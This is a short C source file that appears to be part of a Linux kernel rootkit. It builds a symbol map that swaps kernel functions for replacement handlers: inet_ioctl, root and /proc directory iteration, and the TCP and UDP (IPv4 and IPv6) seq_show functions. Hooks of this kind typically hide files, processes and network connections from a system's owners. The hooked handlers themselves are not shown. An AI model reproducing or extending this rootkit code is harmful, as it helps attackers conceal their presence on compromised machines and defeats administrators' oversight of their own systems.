/* hook */
#include "sym_map.h"

/* hooked */
#include "inet_ioctl.h"
#include "root_iterate.h"
#include "proc_iterate.h"
#include "udp4_seq_show.h"
#include "udp6_seq_show.h"
#include "tcp4_seq_show.h"
#include "tcp6_seq_show.h"

// hold the new symbols
static sym_t _new = {
        .inet_ioctl    = m_inet_ioctl,
        .root_iterate  = m_root_iterate,
        .proc_iterate  = m_proc_iterate,
        .udp4_seq_show = m_udp4_seq_show,
        .udp6_seq_show = m_udp6_seq_show,
        .tcp4_seq_show = m_tcp4_seq_show,
        .tcp6_seq_show = m_tcp6_seq_show
};

// hold the old symbols
static sym_t _old = {
        .inet_ioctl    = NULL,
        .root_iterate  = NULL,
        .proc_iterate  = NULL,
        .udp4_seq_show = NULL,
        .udp6_seq_show = NULL,
        .tcp4_seq_show = NULL,
        .tcp6_seq_show = NULL
};

// global symbol map
sym_map_t sym_map;

void sym_map_init(void)
{
        sym_map.old = &_old;
        sym_map.new = &_new;
}

